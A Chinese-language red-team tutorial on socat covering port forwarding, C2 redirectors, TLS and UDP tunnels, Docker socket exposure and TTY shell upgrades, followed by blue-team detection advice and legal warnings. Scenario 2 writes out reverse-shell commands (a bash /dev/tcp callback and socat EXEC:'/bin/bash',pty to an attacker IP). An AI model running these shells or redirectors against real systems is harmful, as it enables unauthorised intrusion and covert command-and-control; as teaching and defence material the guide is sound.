# socat（万能中继 / 重定向器）

> **一句话**：把**任意两个数据通道**对接起来——TCP、UDP、Unix socket、文件、管道、串口、PTY、SSL，全都能互相「接」；一个命令就能做端口转发、加密隧道、简单重定向器、甚至把普通 shell 升级成可交互的 TTY。
> **分类**：基础设施与 C2 / 网络中继 ｜ **Kali 包**：`socat`（命令 `socat`、`socat1`、`filan`、`procan`）｜ **官方文档**：<http://www.dest-unreach.org/socat/> ｜ `man socat`

---

## 1. 它解决什么问题

渗透与红队工作里充满了「**把 A 接到 B**」的需求，而这些需求用 `nc` 往往做不好：

| 需求 | `nc` | **socat** |
|------|------|-----------|
| 端口转发（本地 8080 → 内网 80） | 需要 `-c` + 双管道，不稳定 | `TCP-LISTEN:8080,fork TCP:10.0.0.5:80` |
| **同时服务多个连接** | 只能串行 | `fork` 一个选项搞定 |
| **SSL/TLS 加密隧道** | 不支持 | `OPENSSL-LISTEN` / `OPENSSL:` |
| UDP 转发 | 有限 | 一等公民 |
| Unix socket 转发 | 不支持 | `UNIX-LISTEN` ←→ `TCP:` |
| **shell 升级为真 TTY** | 做不到 | `PTY` + `raw,echo=0` |
| 串口/设备转发 | 不支持 | 支持（`/dev/ttyUSB0`） |
| 保留连接不断开 | 不好控制 | `-t`、`ignoreeof`、`retry` |

**在红队视角里**，socat 最常见的三个用途：

1. **重定向器（Redirector）**：把公网/前置端口转发到真正的 C2 端口，让 C2 不直接暴露（见 [`sliver.md`](sliver.md)、[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)）；
2. **内网端口转发**：在被控主机上把「只有它可达的内网端口」转发出来（轻量替代 chisel/ligolo）；
3. **Shell 升级**：把裸反弹 shell 变成可交互的 PTY（Tab 补全、`vi`、`top` 都能用）。

对比同类：

| 工具 | 定位 | 差异 |
|------|------|------|
| **socat** | 通用字节流中继 | 通道类型最多（TCP/UDP/UNIX/PTY/SSL/串口/文件）；**单命令、无需配置** |
| **`chisel`** | HTTP 隧道 | 擅长穿透 HTTP 代理与反向连接；见 [`../08-后渗透/chisel.md`](../08-后渗透/chisel.md) |
| **`ligolo-ng`** | TUN 隧道 | 支持 UDP/ICMP、多层路由；见 [`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md) |
| **`ssh -L/-R/-D`** | 端口转发/代理 | 需要 SSH 服务与凭据；加密与认证更成熟 |
| **`apache2`/nginx** | HTTP 重定向器 | 应用层（能改 Header、按路径/域名分流）；见 [`apache2.md`](apache2.md) |
| **`nc`** | 简单 TCP | 功能最少、最方便 |

**一句话选型**：**单命令能搞定的中继用 socat；要穿透 HTTP 白名单用 chisel；要多协议多层用 ligolo-ng；要按域名/路径伪装分流用 apache2。**

---

## 2. 工作原理

```
socat [options] <address1> <address2>
        │              │
        │              └─ 数据通道 2（"右"）
        └─ 数据通道 1（"左"）

数据在两个通道之间双向流动（默认是全双工）；两侧都是「地址（address）」，
语法：<address-head>[,<option>[,<option>...]]
```

**核心概念**：

- **地址（address）**：每个通道的"类型 + 参数"。`socat -hh` 会列出所有地址类型。
- **地址组（address groups）**：同类型地址共享一组选项（例如所有 TCP 地址共享 `TCP` 组的选项：`bind`、`reuseaddr`、`keepalive`、`nodelay`、`mss`…）。
- **`fork`**：`LISTEN` 类地址的选项。**不加 `fork` 时服务端只能处理一个连接，处理完就退出**——这是最常见的坑。
- **`!!` 语法**：`<address>!!<address>` 表示「一个地址既做数据同步又做数据源」（高级用法）。
- **`-d -d -d`**：增加日志详细度（排错必备，能看到"谁连上来了、TLS 握手是否成功"）。
- **`-v` / `-x`**：把流动的数据以文本/十六进制 dump 出来（**调试协议、观察 C2 流量是否到达的利器**）。
- **`-t <n>`**：关闭第二个通道前等待的秒数（避免数据还没传完就断开）。
- **PTY + `raw,echo=0`**：把网络连接接到一个**伪终端**上，从而让远端 shell 拿到真正的 TTY。
- **重定向器的原理极简**：`socat TCP-LISTEN:80,fork,reuseaddr TCP:<C2-IP>:443` —— 进来的 80 端口流量原样转发到 C2 的 443。**它的价值不在"高级"，而在于"简单、可靠、无声"**。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install socat
socat -V
```

```console
socat by Gerhard Rieger and contributors - see www.dest-unreach.org
socat version 1.8.1.3 on ...
   running on Linux ...
```

```bash
socat -h        # 通用选项 + 常用地址名
socat -hh       # 加上所有常用地址选项
socat -hhh      # 加上全部地址选项
```

**最短的三个实用命令**：

```bash
# ① 端口转发（本地 8080 → 内网 10.10.20.5:80）
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80

# ② 重定向器（把 80 转发到真正的 C2 端口 8443）
socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8443

# ③ 把反弹 shell 升级成真 TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## 4. 核心参数详解

### 4.1 通用命令行选项（真实选项，来自 `socat -hh`）

| 选项 | 作用 | 使用建议 |
|------|------|----------|
| `-V` | 打印版本与编译特性（**确认是否支持 OPENSSL**） | 部署前先看它 |
| `-h` / `-hh` / `-hhh` | 帮助（逐步详细） | 查地址与选项 |
| `-d[ddd]` | 提高日志级别（最多 4 次；**推荐 `-d -d`**） | **排错第一步** |
| `-d0..-d4` | 直接指定日志级别（0 错误 / 4 全部含调试） | 脚本化 |
| `-D` | 在进入循环前分析文件描述符 | 复杂场景 |
| `--statistics` | 退出时输出传输统计 | 量化验证 |
| `-ly` / `-lf<file>` / `-ls` / `-lm` | 日志到 syslog / 文件 / stderr / 混合 | 服务化部署 |
| `-lp<name>` | 设置日志中的程序名 | 多实例区分 |
| `-lu` / `-lh` | 日志带微秒 / 带主机名 | 时间线对齐 |
| **`-v`** | **文本 dump 双向流量** | **验证"流量真的到了"** |
| **`-x`** | **十六进制 dump 双向流量** | 二进制协议调试 |
| `-r <file>` / `-R <file>` | 只 dump 左→右 / 右→左 的原始数据 | 抓单向流量 |
| `-b<size>` | 缓冲区大小（默认 8192） | 大吞吐场景调大 |
| `-s` | sloppy 模式（出错继续） | 不稳定链路 |
| `-t<timeout>` | **关闭第二通道前等待秒数** | **转发大文件时调大**（避免截断） |
| `-T<timeout>` | 总不活动超时 | 长连接保活控制 |
| `-u` / `-U` | 单向模式（左→右 / 右→左） | 只做单向搬运 |
| `-g` | 不检查组选项 | 高级 |
| `-L <lockfile>` / `-W <lockfile>` | 加锁（失败退出 / 等待） | **防止启动两个相同转发** |
| `-0` / `-4` / `-6` | IP 版本偏好 | 明确用 IPv4 时加 `-4` |

### 4.2 常用地址类型（`socat -hh` 里的 address-head）

| 地址类型 | 含义 | 示例 |
|----------|------|------|
| `TCP-LISTEN:<port>` | **监听 TCP** | `TCP-LISTEN:8080,fork,reuseaddr` |
| `TCP:<host>:<port>` | 连接 TCP | `TCP:10.10.20.5:80` |
| `TCP4-*` / `TCP6-*` | 强制 IPv4/IPv6 | `TCP4-LISTEN:8080,fork` |
| `UDP-LISTEN:<port>` | **监听 UDP** | `UDP-LISTEN:53,fork` |
| `UDP:<host>:<port>` | UDP 发送/接收 | `UDP:8.8.8.8:53` |
| `UDP-RECVFROM` / `UDP-SENDTO` | 单向 UDP | 特殊场景 |
| `OPENSSL-LISTEN:<port>` | **TLS 监听**（需证书） | `OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork` |
| `OPENSSL:<host>:<port>` | **TLS 连接** | `OPENSSL:example.com:443,verify=0` |
| `UNIX-LISTEN:<path>` | Unix socket 监听 | `UNIX-LISTEN:/tmp/s.sock,fork` |
| `UNIX-CONNECT:<path>` | 连 Unix socket | `UNIX-CONNECT:/var/run/docker.sock` |
| `ABSTRACT-LISTEN` / `ABSTRACT-CONNECT` | Linux 抽象命名空间 socket | `ABSTRACT-LISTEN:mysock,fork` |
| `EXEC:<command>` | **执行程序并接到它的 stdin/stdout** | `EXEC:/bin/cat` |
| `SYSTEM:<command>` | 交给 shell 执行 | `SYSTEM:'bash -i'` |
| `SHELL:<cmd>` | 通过 shell 执行 | 与 SYSTEM 类似（视版本） |
| `FD:<n>` | 使用已有文件描述符 | `FD:0` |
| `FILE:<path>` | 打开文件 | `FILE:/tmp/out.bin,create,append` |
| `GOPEN:<path>` | 通用打开（文件或设备） | `GOPEN:/dev/ttyUSB0` |
| `CREATE:<path>` | 创建文件 | —— |
| `PTY` | **分配伪终端**（把远端变成真 TTY） | `PTY,raw,echo=0` |
| `READLINE` | 带行编辑的交互（socat 侧） | 本地交互友好 |
| `EXEC:... ,pty,stderr,setsid,sigint,ctty` | 经典「shell 升级」组合 | 见第 5 节 |
| `TUN[:<ip>/<mask>]` | TUN 设备（点对点） | 高级：裸 IP 隧道 |
| `INTERFACE:<if>` | 直接收发二层帧 | 需要 root |
| `SCTP-*` / `DCCP-*` | 其它传输层协议 | 少见 |
| `PROXY:<host>:<port>` | 经 HTTP 代理连接 | 受环境限制时用 |
| `SOCKS4:` / `SOCKS5:`（视版本） | 经 SOCKS 代理 | 逐层穿透 |
| `VSOCK-CONNECT` / `VSOCK-LISTEN` | VM socket（宿主机↔虚拟机） | 虚拟化场景 |

### 4.3 高频地址选项（**必须掌握的几个**）

| 选项 | 适用地址 | 作用 | 使用建议 |
|------|----------|------|----------|
| **`fork`** | `*-LISTEN` | **每个连接 fork 一个子进程** | **不做服务端必加**（否则只能服务一个连接） |
| **`reuseaddr`** | `*-LISTEN` | 允许快速重启（REUSEADDR） | **几乎总该加** |
| `bind=<addr>` | 连接/监听 | 指定本地绑定地址 | 多网卡时指定出口 |
| `range=<a-b>` | `*-LISTEN` | **只接受特定来源 IP 范围** | **重定向器的访问控制**（重要！） |
| `retry=<n>` | 连接 | 连接失败重试次数 | 转发的目标暂时不可用时用 |
| `interval=<sec>` | 连接 | 重试间隔 | 配合 `retry` |
| `ignoreeof` | 连接 | 忽略 EOF（不因对端关闭而退出） | 长连接/交互 shell |
| `keepalive` | TCP | 开启 TCP keepalive | 长连接 |
| `nodelay` | TCP | 禁用 Nagle（降低延迟） | 交互式场景 |
| `mss=<n>` / `mtu` | TCP | 调整 MSS/MTU | 隧道套隧道时避免分片问题 |
| `crnl` | 文本通道 | **CR/LF 转换** | 交互 shell 显示问题 |
| `raw` / `icanon=0` / `echo=0` | `PTY` | **关闭行缓冲与回显** | **shell 升级的关键** |
| `cert=` / `key=` / `verify=` / `cafile=` | `OPENSSL*` | 证书与校验 | `verify=0` 表示不校验证书（实验用） |
| `verify=1` + `cafile` | `OPENSSL*` | **校验对端证书** | 生产化隧道应开启 |
| `readbytes=<n>` | 任意 | 读满 n 字节后关闭 | 定长协议 |
| `append` / `create` | `FILE` | 追加/创建 | 日志记录 |

---

## 5. 实战演练

> **环境声明**：以下全部在**完全隔离的自建实验室**中进行（自己的 Kali、自己的靶机、Host-Only 网络）。
> **socat 本身是合法网络工具**，但**用转发/隧道访问未授权主机、搭建 C2 重定向器对外攻击未授权目标**均属违法（《刑法》第 285/286 条）。授权测试中，转发器的**目标与来源都必须落在授权范围内**。

### 场景 1：端口转发与重定向器（最常用）

**1a. 把内网端口"搬"到本机（内网渗透的基础操作）**

```bash
# 在被控跳板机（Linux，已获得 shell）上执行：
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80 &
```

```bash
# 攻击机上（如果能直接到跳板机的 8080）
curl -s http://192.168.56.10:8080/ | head -5
```

**解读**：`TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80` 的含义是：

| 部分 | 含义 |
|------|------|
| `TCP-LISTEN:8080` | 在**跳板机**上监听 8080 |
| `fork` | **每个新连接起一个子进程**（并发处理） |
| `reuseaddr` | 快速重启不报 `Address already in use` |
| `TCP:10.10.20.5:80` | 把数据转发到**跳板机可达**的 `10.10.20.5:80` |

**注意**：`10.10.20.5` 是**跳板机视角**的地址（往往攻击机访问不到），这正是转发的意义。

**1b. 单命令重定向器（把前置端口接到真正的 C2 端口）**

```bash
# 假设 C2 监听在 127.0.0.1:8443（不直接暴露），用 80 做前置
sudo socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8443 &
```

```bash
# 验证转发是否工作（-d -d 看日志）
sudo socat -d -d TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:8443
```

```console
2026/03/02 10:12:31 socat[12345] N listening on AF=2 0.0.0.0:8080
2026/03/02 10:12:45 socat[12345] N accepting connection from AF=2 192.168.56.50:51234 on AF=2 0.0.0.0:8080
2026/03/02 10:12:45 socat[12346] N opening connection to AF=2 127.0.0.1:8443
2026/03/02 10:12:45 socat[12346] N successfully connected from local address AF=2 127.0.0.1:40122
2026/03/02 10:12:45 socat[12346] N starting data transfer loop
```

**解读（日志逐行）**：`listening` → `accepting connection from <目标>` → `opening connection to <C2>` → `starting data transfer loop`。**这四行就是"重定向器工作正常"的完整证据**（也可作为演练记录）。

**1c. 加访问控制的重定向器（**生产化必须做**）**

```bash
# 只接受授权网段 192.168.56.0/24 的连接
sudo socat TCP-LISTEN:80,fork,reuseaddr,range=192.168.56.0/24 TCP:127.0.0.1:8443
```

**解读**：`range=` 是**授权测试里保护自己的重要选项**——它能确保转发器只会服务于你被授权的那一段来源。**不加它，你的重定向器就是一台对全网开放的开放代理**（这在很多司法辖区本身就是问题）。

**1d. 查看流量是否真的到达（`-v`/`-x`）**

```bash
# 文本 dump：适合 HTTP 之类
sudo socat -v TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80
```

```console
> 2026/03/02 10:20:11.123456  length=78 from=0 to=77
GET / HTTP/1.1\r
Host: 10.10.20.5\r
...
< 2026/03/02 10:20:11.234567  length=245 from=0 to=244
HTTP/1.1 200 OK\r
...
```

```bash
# 十六进制 dump：适合二进制协议
sudo socat -x TCP-LISTEN:9001,fork,reuseaddr TCP:10.10.20.5:9001
```

**解读**：`>` 表示左→右（客户端→服务端），`<` 表示右→左。**排错时先看"有没有数据"，再看"数据长什么样"。**

### 场景 2：把反弹 shell 升级成真 TTY（**渗透测试中的高频动作**）

**问题**：用 `nc -lvnp 4444` 接到的 shell 是"哑"的——没有 Tab 补全、按方向键出乱码、`vi`/`top`/`sudo` 都不能用。

**方案 A：用 socat 起监听端（把本地 tty 接到网络）**

```bash
# 攻击机（终端 A）
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```console
# 目标机（授权靶机）上执行反弹
bash -i >& /dev/tcp/192.168.56.5/4444 0>&1
```

```console
# 攻击机终端里直接就是可交互 shell：
www-data@target:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@target:/var/www$ 
```

**解读**：`file:\`tty\`,raw,echo=0` 把**你当前终端的伪终端**直接接到网络上，`raw,echo=0` 关闭了本地的行缓冲与回显 → **远端的 shell 拿到一个真正的 TTY**。

**方案 B：在目标侧用 socat 起 TTY（更可靠）**

```bash
# 攻击机监听
nc -lvnp 4444
```

```bash
# 目标（授权靶机）执行：分配 PTY 并把 shell 挂上去
socat TCP:192.168.56.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

**解读（选项逐个解释）**：

| 选项 | 作用 |
|------|------|
| `EXEC:'/bin/bash'` | 执行 bash，并把它的 stdin/stdout 接到网络 |
| `pty` | **分配伪终端**（让 bash 认为自己在终端里） |
| `stderr` | 把标准错误也接进去（否则看不到报错） |
| `setsid` | 新建会话（脱离父进程，**Ctrl+C 不会杀掉自己**） |
| `sigint` | 把 Ctrl+C 正确传递到远端 |
| `sane` | 把终端设成正常模式（等价于 `raw,echo=0` 的组合语义） |

**方案 C：已经有了哑 shell，就地升级（不发新反弹）**

```console
# 在哑 shell 里（目标上）
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 然后 Ctrl+Z 挂起，回到攻击机
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**解读**：如果目标有 python3，这条最快；如果目标有 socat，用方案 B 更稳（**socat 的 TTY 通常比 python 的 pty.spawn 更完整**）。

**判断"是否拿到了真 TTY"**：

```console
$ tty
/dev/pts/0            ← 有输出说明是真 TTY
$ stty size
40 160                ← 能读到行列数说明没问题
```

### 场景 3：加密隧道、UDP 转发与串联（进阶用法）

**3a. 用 TLS 包一层（自签证书，实验用）**

```bash
# ① 先生成自签证书
openssl req -x509 -newkey rsa:2048 -nodes -keyout srv.key -out srv.crt -days 30 \
  -subj "/CN=lab.local"

# ② 服务端（Kali）：TLS 监听 443，转发到内部服务
sudo socat OPENSSL-LISTEN:443,cert=srv.crt,key=srv.key,verify=0,reuseaddr,fork \
     TCP:127.0.0.1:8080

# ③ 客户端（跳板机/目标）：把本地 8080 通过 TLS 隧道送到 Kali
socat TCP-LISTEN:8080,fork,reuseaddr OPENSSL:192.168.56.5:443,verify=0
```

```bash
# ④ 验证（在客户端所在机器上访问本地 8080，实际经过了 TLS 隧道）
curl -s http://127.0.0.1:8080/ | head -3
```

**解读**：

| 部分 | 含义 |
|------|------|
| `OPENSSL-LISTEN:443,cert=...,key=...,verify=0` | 用 TLS 监听；`verify=0` 表示**不校验对端证书**（实验） |
| `fork,reuseaddr` | 并发 + 快速重启 |
| `OPENSSL:<host>:443,verify=0` | 客户端侧用 TLS 连接 |

**⚠️ 注意**：`verify=0` 只适合实验。**要防中间人必须提供 `cafile=` 并设 `verify=1`**（双向校验更好，见 `cafile`/`cert`/`key` 的组合）。

**3b. UDP 转发（**socat 相对 nc 的明显优势**）**

```bash
# 把本地 UDP 5353 转发到内网 UDP 53（例如探测内网 DNS）
socat UDP-LISTEN:5353,fork UDP:10.10.20.5:53 &
dig @127.0.0.1 -p 5353 example.com +short
```

**解读**：**proxychains 不支持 UDP**（见 [`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)），而 socat 可以。**在必须处理 UDP（DNS/SNMP/DHCP）的场景，socat 是简单可靠的解法。**

**3c. 串联多个 socat（多跳转发）**

```bash
# 跳板机 A（192.168.56.10）：把 8080 转发到跳板机 B
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.10:8080

# 跳板机 B（10.10.20.10，双网卡）：把 8080 转发到最终目标
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.30.5:80

# 攻击机：直接访问跳板机 A 的 8080，实际到达 10.10.30.5:80
curl -s http://192.168.56.10:8080/
```

**解读**：**多跳转发用 socat 会"每层都要人肉维护"**。跳数多了建议改用 [`ligolo-ng`](../08-后渗透/ligolo-ng.md)（TUN 路由，天然支持多层），或者用 [`chisel`](../08-后渗透/chisel.md) 的反向 SOCKS。

**3d. 转发 Unix socket（例如把 Docker socket 暴露出来做研究）**

```bash
# 把本地 2375 转发到 Docker 的 Unix socket（**只在自建实验环境做**）
socat TCP-LISTEN:2375,fork,reuseaddr UNIX-CONNECT:/var/run/docker.sock
curl -s http://127.0.0.1:2375/version | head -5
```

**解读**：这类操作在**容器逃逸研究**中很常见（Docker socket 暴露 = 宿主机控制权）。**这也是蓝队必须监控的一条：绝不能让容器挂载 `/var/run/docker.sock`。**

---

## 6. 输出解读

### 6.1 `-d -d` 日志行

| 日志内容 | 含义 | 判断 |
|----------|------|------|
| `N listening on AF=2 0.0.0.0:8080` | 监听成功 | 服务已就绪 |
| `N accepting connection from AF=2 <src>` | **有连接进来** | 目标/客户端已到达 |
| `N opening connection to AF=2 <dst>` | 正在连转发目标 | 若卡住 → 目标不可达 |
| `N successfully connected from local address ...` | **到目标的连接建立** | 转发链路打通 |
| `N starting data transfer loop` | 开始转发数据 | 正常工作 |
| `E connect(5, AF=2 <dst>, 16): Connection refused` | 目标端口没开/服务未起 | 检查目标服务 |
| `E connect(5, ...): Network is unreachable` | 路由不通 | 检查路由/网卡 |
| `N exiting with status 0` | 正常结束 | —— |
| `I refusing connection from <ip>`（配 `range=`） | **来源不在允许范围** | 访问控制生效（**这是好事**） |

### 6.2 `-v` / `-x` 流量 dump

| 标记 | 方向 |
|------|------|
| `>` | 左 → 右（如 客户端 → 目标） |
| `<` | 右 → 左（回包） |
| `length=N from=A to=B` | 本次数据长度与流内偏移 | 

**用途**：
- 确认「**是否真的有数据流动**」（比看端口是否 LISTEN 更可靠）；
- 判断「**协议是否合规**」（例如 C2 流量是否与伪装协议相符）；
- 记录**证据片段**（授权测试报告中可以引用）。

### 6.3 成功判据

| 判据 | 说明 |
|------|------|
| 监听端口出现（`ss -lntp \| grep <port>`） | 服务已起 |
| 客户端能拿到**真实服务响应**（而非连接重置） | 转发链路正确 |
| `-d -d` 日志出现 `starting data transfer loop` | 数据面工作 |
| `--statistics` 退出时显示**非零字节数** | 确实有流量经过 |

---

## 7. 与其他工具配合

```
① 拿到落脚点（msf / impacket / webshell / C2 会话）
        │
② 需要"通路"时按场景选工具：
   ├─ 一条命令转发一个端口            → socat（本文）
   ├─ 要穿透 HTTP 代理 / 反向连接      → chisel        ../08-后渗透/chisel.md
   ├─ 要 UDP/ICMP、多层网段           → ligolo-ng     ../08-后渗透/ligolo-ng.md
   ├─ 要用 SOCKS 驱动任意 TCP 工具     → proxychains4  ../08-后渗透/proxychains4.md
   └─ 要按域名/路径伪装分流（HTTP）    → apache2       apache2.md
        │
③ 通路之上做横向
   nxc / impacket / evil-winrm / nmap        ../08-后渗透/
        │
④ C2 基础设施
   sliver（自带 socks5/portfwd）             sliver.md
   socat 做前置重定向器（+ range= 做访问控制）
```

**socat ↔ 其它工具的典型组合**：

| 组合 | 效果 |
|------|------|
| socat + `nc` | 把哑 shell 升级为 TTY（反向） |
| socat + `chisel` | chisel 负责穿透，socat 负责把某个 UDP 端口也带出去 |
| socat + `apache2` | apache 负责应用层伪装分流，socat 做后端转发 |
| socat + `msfvenom` 载荷 | 用 socat 接收反弹会话（避免 msf handler 的默认特征） |

- C2 框架：[`sliver.md`](sliver.md) ｜ HTTP 重定向器：[`apache2.md`](apache2.md)
- 隧道选型：[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md)、[`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| 只能服务**一个**连接，之后就没反应 | **忘了 `fork`** | 加 `,fork`（`LISTEN` 地址必加） |
| `Address already in use` | 端口被占用/上次没退干净 | 加 `reuseaddr`；`ss -lntp \| grep <port>` 找占用者 |
| 转发大文件被**截断** | 默认 `-t` 时间太短，连接被提前关闭 | 加 `-t 60`（甚至更大）；或加 `ignoreeof` |
| 交互 shell 里**方向键乱码 / Ctrl+C 直接退出** | 没有真 TTY / 没有 `setsid`/`sigint` | 用 `PTY,raw,echo=0` 或 `pty,stderr,setsid,sigint,sane` |
| `OPENSSL` 相关报 `unknown device/address` | socat **编译时未启用 OpenSSL** | `socat -V` 看特性；换发行版包或自编译 |
| TLS 握手失败 | 证书路径/权限/格式错，或对端校验不通过 | `-d -d` 看握手细节；实验用 `verify=0`，生产配 `cafile` |
| 目标不可达但 socat 不报错 | 连接卡在 `opening connection` | 加 `-d -d` 看日志；在被控机上先 `nc -vz <dst> <port>` 验证 |
| 重定向器成为**开放代理** | 没加访问控制 | **加 `range=<授权网段>`**；并用防火墙限制来源 |
| 启动了两个相同转发，行为诡异 | 没加锁 | 用 `-L <lockfile>`（失败退出）或 `-W`（等待） |
| 隧道套隧道后**大包失败/卡死** | MTU/MSS 问题（封装开销导致分片） | 调整 `mss=` / `mtu=`；或改用 TUN 方案（ligolo-ng） |
| UDP 转发的应答收不到 | 用错了地址类型（单向 vs 双向） | 用 `UDP-LISTEN` + `UDP:`（双向）；单向用 `UDP-RECVFROM`/`UDP-SENDTO` |
| `-v` 输出刷屏影响性能 | dump 开销 | 排错时再用；生产不开 |
| 进程退了但端口还占着 | TIME_WAIT / 子进程残留 | `reuseaddr`；`pkill socat`；检查 `ss -lntp` |
| 转发被检测为异常流量 | 长连接、非标准端口、协议与端口不符 | **这正是蓝队会抓的**；授权测试中记录该检测结果 |

---

## 9. 防御视角（蓝队）

socat 是**中继工具**，它的痕迹主要在**网络侧**（连接模式）与**主机侧**（进程与监听端口）。

| 攻击用途 | 检测信号 | 缓解措施 |
|----------|----------|----------|
| **重定向器**（前置端口 → C2） | 服务器上出现**不明监听端口**；某进程长时间把连接转发到固定内部地址；长连接且流量特征与端口语义不符 | **主机端口/监听基线监控**（`ss -lntp` 定期采集并比对）；出站白名单；服务器不应有非业务监听 |
| **端口转发跳板** | 单主机出现"接受连接 + 立刻建立到内网的新连接"的**成对行为**（NetFlow 中很明显） | **网络分段/微隔离**；东西向流量审计；主机防火墙 |
| **反向 shell 接收** | 服务器上 `socat`/`nc` 进程；异常出站/入站连接；shell 进程父进程异常（如 `web` 用户启动 `bash`） | EDR 进程树规则；**Web 用户不应能起交互 shell** |
| **TLS 隧道** | 到外部 IP 的**长时 TLS 连接**；JA3/JA4 指纹与常见客户端不符；自签证书 | TLS 检查（**能看到证书**）；出站白名单；TLS 指纹情报 |
| **UDP 隧道/转发** | 非常规 UDP 长会话（DNS 之外的 UDP 出站） | 内网 UDP 出站限制；DNS 只允许企业解析器 |
| **Unix socket 转发（如 Docker socket）** | 出现把 `/var/run/docker.sock` 暴露为 TCP 的进程 | **绝不把 docker.sock 挂进容器**；主机侧 EDR 监控 socket 文件读取 |
| **socat 二进制落地** | 非业务系统出现 `socat` 文件；包管理器日志中没有对应安装 | 应用白名单（WDAC/AppArmor）；文件完整性监控；`auditd` 监控 execve |
| **`range=` 未设置** | 直接表现为**你的服务器成了开放代理**（可能被他人滥用） | 这是攻击方的失误，但会带来额外法律风险——**授权测试必须设置** |

**蓝队可落地的五条**：

1. **建立"监听端口基线"**：定期采集并比对 `ss -lntp` / Windows 的监听端口，**任何新监听都告警**（这一条能抓住几乎所有转发器）；
2. **出站流量治理**：正向代理 + 白名单（对 socat/chisel/sliver **一律有效**）；
3. **进程树规则**：`apache/nginx/php-fpm/java` 等不应派生出 `bash`/`sh`/`socat`/`nc`；
4. **NetFlow/东西向分析**：关注「一台主机同时接受外部连接并向内网发起连接」的成对模式；
5. **文件完整性 + 白名单**：服务器上出现 `socat`（非业务组件）应立刻可见。

**给蓝队的额外提示**：socat 也是**蓝队自己的好工具**——例如用它把内部服务的 Unix socket 临时暴露给调试工具、或做流量的可视化 dump（`-v`/`-x`）来确认"到底有没有异常流量经过"。**工具中立，用途决定性质。**

---

## 10. 参考

- socat 官网（含完整文档与手册）：<http://www.dest-unreach.org/socat/>
- socat 手册：<http://www.dest-unreach.org/socat/doc/socat.html> ｜ 本地 `man socat`
- Kali 工具页：<https://www.kali.org/tools/socat/>
- 本地命令：`socat -V`（版本与编译特性）、`socat -h`、`socat -hh`、`socat -hhh`、`man socat`、`man filan`、`man procan`
- MITRE ATT&CK · 协议隧道（T1572）、代理（T1090）、非应用层协议（T1095）、远程服务滥用（T1021）
- 相关教程：[`sliver.md`](sliver.md)、[`apache2.md`](apache2.md)、[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md)、[`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)

## ⚠️ 法律与伦理

**socat 是合法的通用网络工具**（运维中常用于串口转发、服务对接、socket 调试）。但把它用于以下目的可能违法：

- **搭建转发器访问未授权主机**：《刑法》第 285 条（非法侵入计算机信息系统、非法获取计算机信息系统数据、**非法控制计算机信息系统**）；
- **搭建 C2 重定向器对外攻击未授权目标**：同上，且可能构成第 286 条（破坏计算机信息系统）；
- **把服务器配置为开放代理/开放转发器**：可能违反《网络安全法》第 27 条（提供用于非法侵入的程序、工具），并在实践中被他人滥用后牵连到你；
- **转发/窃听他人通信内容**：可能触犯《刑法》第 252 条（侵犯通信自由罪）。

**使用要求**：

1. **只在授权的范围与时间窗内转发**（**来源与目标都必须落在授权范围**）；
2. **必须设置 `range=` 或防火墙限制**，避免变成开放代理；
3. **不在生产系统上长期留存转发器**（会破坏网络的可见性与可维护性）；
4. **测试结束清理**：`pkill socat`、删除脚本、关闭端口、清理防火墙规则，并保留清理记录；
5. **不要用 socat 转发/窃听与测试无关的通信**（这既是法律问题，也是职业操守问题）；
6. 本教程示例请在**自建的隔离实验环境**中复现。
